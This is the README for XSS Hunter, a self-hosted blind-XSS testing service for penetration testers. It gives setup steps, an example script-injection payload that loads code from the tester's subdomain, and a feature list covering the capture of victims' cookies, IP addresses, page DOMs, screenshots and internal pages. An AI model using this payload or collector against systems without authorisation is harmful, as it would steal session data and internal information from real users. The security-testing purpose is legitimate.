# XSS Hunter Source Code
This is a portable version of the source code running on https://xsshunter.com. It is designed to be easily-installable on any server for security professionals and bug bounty hunters who wish to test for XSS in a much more powerful way. This fork of XSS Hunter has been refactored to be compatible with Python 3 and as such, some dependencies have changed. It is recommended to ensure you're using Python 3+ in your virtual environment.

**If you don't want to set up this software and would rather just start testing, see https://xsshunter.com .**

# Requirements
* A server running (preferably) Ubuntu.
* A [Mailgun](http://www.mailgun.com/) account, for sending out XSS payload fire emails.
* A domain name, preferably something short to keep payload sizes down. Here is a good website for finding two letter domain names: [https://catechgory.com/](https://catechgory.com/). My domain is [xss.ht](xss.ht) for example.
* A wildcard SSL certificate. This is required because XSS Hunter identifies users based off of their sub-domains and they all need to be SSL-enabled. Let's Encrypt now supports wildcard certificates.
    
# Setup
Original setup post: https://thehackerblog.com/xss-hunter-is-now-open-source-heres-how-to-set-it-up/

**Setting Up DNS**
The first thing you need to do is set up the DNS for your domain name so it is pointing to the server you’re hosting the software on. Only two records are needed for this:

A record:
Key: YOURDOMAIN.COM
Value: SERVER_IP
CNAME record:
Key *.YOURDOMAIN.COM
Value: YOURDOMAIN.COM
Those two records simply state where your server is located and that all subdomains should point to the same server.

**Setting Up Dependencies**
First, we need to install some dependencies for XSS Hunter to work properly. The two dependencies that XSS Hunter has are nginx for the web server and postgres for the data store. Setting these up is fairly easy, we’ll start with nginx:

sudo apt-get install nginx

After that, install postgres:

sudo apt-get install postgresql postgresql-contrib

Now we’ll set up a new postgres user for XSS Hunter to use:

sudo -i -u postgres
psql template1
CREATE USER xsshunter WITH PASSWORD 'EXAMPLE_PASSWORD';
CREATE DATABASE xsshunter;
\q
exit

Now we have all the dependencies installed, let’s now move on to setting up the software itself.

**Setting Up Source Code**
Clone the Github repo:

git clone https://github.com/mandatoryprogrammer/xsshunter

Now that we’ve cloned a copy of the code, let’s talk about XSS Hunter’s structure. The service is broken into two separate servers, the GUI and the API. This is done so that if necessary the GUI server could be completely replaced with something more powerful without any pain, the same going for the API.

Let’s start by running the config generation script:

./generate_config.py
Once you’ve run this script you will now have two new files. One is the config.yaml file which contains all the settings for the XSS Hunter service and the other is the default file for nginx to use. Move the default file into nginx’s configuration folder by running the following command:

sudo mv default /etc/nginx/sites-enabled/default
You must also ensure that you also have your SSL certificate and key files in the following locations:

/etc/nginx/ssl/yourdomain.com.crt; # Wildcard SSL certificate
/etc/nginx/ssl/yourdomain.com.key; # Wildcard SSL key
(The config generation script will specify the location you should use for these files.)

Now you need to restart nginx to apply these changes, run the following:

sudo service nginx restart

Awesome! Nginx is now all set up and ready to go. Let’s move on to the actual XSS Hunter service set up.

Now let’s start the API server! Run the following commands:

sudo apt-get install python-virtualenv python-dev libpq-dev libffi-dev
cd xsshunter/api/
virtualenv env
. env/bin/activate
pip3 install -r requirements.txt
./apiserver.py &
The & after the ./apiserver.py command will run the server in the background. It can be terminated by restarting the host or by killing the process manually.

In this new terminal let’s start the GUI server, run the following commands (in a new terminal):

cd xsshunter/gui/
virtualenv env
. env/bin/activate
pip3 install -r requirements.txt
./guiserver.py &

Congrats! You should now have a working XSS Hunter server. Visit your website to confirm everything is functioning as expected. You can now detach from tmux by typing CTRL+B followed by D.

# Summary of Functionality
*Upon signing up you will create a special short domain such as `yoursubdomain.xss.ht` which identifies your XSS vulnerabilities and hosts your payload. You then use this subdomain in your XSS testing, using injection attempts such as `"><script src=//yoursubdomain.xss.ht></script>`. XSS Hunter will automatically serve up XSS probes and collect the resulting information when they fire.*

# Features
* **Managed XSS payload fires**: Manage all of your XSS payloads in your XSS Hunter account's control panel.
* **Powerful XSS Probes**: The following information is collected everytime a probe fires on a vulnerable page:
    * The vulnerable page's URI 
    * Origin of Execution 
    * The Victim's IP Address 
    * The Page Referer 
    * The Victim's User Agent 
    * All Non-HTTP-Only Cookies 
    * The Page's Full HTML DOM 
    * Full Screenshot of the Affected Page 
    * Responsible HTTP Request (If an XSS Hunter compatible tool is used) 
* **Full Page Screenshots**: XSS Hunter probes utilize the HTML5 canvas API to generate a full screenshot of the vulnerable page which an XSS payload has fired on. With this feature you can peak into internal administrative panels, support desks, logging systems, and other internal web apps. This allows for more powerful reports that show the full impact of the vulnerability to your client or bug bounty program.
* **Markup Report Generation**: Each XSS payload report comes with a pre-generated markdown report. These generated reports are also compatible with other markdown-supporting platforms such as Phabricator for easy bug reporting on company ticketing systems.
* **XSS Payload Fire Email Reports**: XSS payload fires also send out detailed email reports which can be easily forwarded to the appropriate security contacts for easy reporting of critical bugs.
* **Automatic Payload Generation**: XSS Hunter automatically generates XSS payloads for you to use in your web application security testing.
* **Correlated Injections**: Perhaps the most powerful feature of XSS Hunter is the ability to correlated injection attempts with XSS payload fires. By using an [XSS Hunter compatible testing tool](https://github.com/mandatoryprogrammer/xsshunter_client) you can know immediately what caused a specific payload to fire (even weeks after the injection attempt was made!).
* **Option PGP Encryption for Payload Emails**: Extra paranoid? Client-side PGP encryption is available which will encrypt all injection data in the victim's browser before sending it off to the XSS Hunter service.
* **Page Grabbing**: Upon your XSS payload firing you can specify a list of relative paths for the payload to automatically retrieve and store. This is useful in finding other vulnerabilities such as bad `crossdomain.xml` policies on internal systems which normally couldn't be accessed.
* **Secondary Payload Loading**: Got a secondary payload that you want to load after XSS Hunter has done it's thing? XSS Hunter offers you the option to specify a secondary JavaScript payload to run after it's completed it's collection.
* **iOS Web Application**: It is also possible to view your XSS payload fires via an iOS web app. Simple navigate to the `/app` path and save the page as a web application to your iPhone's desktop.

# Notable Exploits
* Blind XSS in Tesla's internal servicing tool: https://samcurry.net/cracking-my-windshield-and-earning-10000-on-the-tesla-bug-bounty-program/
* Blind XSS in Spotify's Salesforce integration: https://mhmdiaa.github.io/blind-xss-in-spotify/
* Blind XSS in GoDaddy's support panel: https://thehackerblog.com/poisoning-the-well-compromising-godaddy-customer-support-with-blind-xss/
